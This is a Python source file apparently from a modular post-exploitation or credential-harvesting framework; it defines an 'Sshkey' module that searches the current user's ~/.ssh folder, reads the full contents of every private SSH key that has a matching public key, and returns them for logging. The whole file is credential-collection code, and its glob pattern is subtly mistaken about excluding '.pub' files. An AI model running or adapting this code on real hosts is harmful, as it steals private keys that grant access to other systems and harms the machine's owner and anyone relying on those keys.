import glob
import os

from repo.modules.Base import Base


class Sshkey(Base):
    """Module used to get all the private ssh keys on the current host"""

    def __init__(self, host) -> None:
        super().__init__(host)
        self.private_keys = []

    def run(self) -> None:
        """Get all the private ssh keys on the current host"""
        ssh_folder = os.path.join(os.path.expanduser('~'), ".ssh")

        if os.path.exists(ssh_folder):
            for key_file in glob.glob(os.path.join(ssh_folder, 'id_*[!pub]')):
                if os.path.exists(f"{key_file}.pub"):
                    key_pair = {
                        "name": os.path.basename(key_file),
                        "private_key": None,
                        "public_key": None
                    }

                    with open(key_file, 'r') as private_key:
                        key_pair["private_key"] = private_key.read()
                    with open(f"{key_file}.pub", 'r') as public_key:
                        key_pair["public_key"] = public_key.read()

                    self.private_keys.append(key_pair)

    def log(self) -> list:
        """Return the private ssh keys found on the current host"""
        return self.private_keys
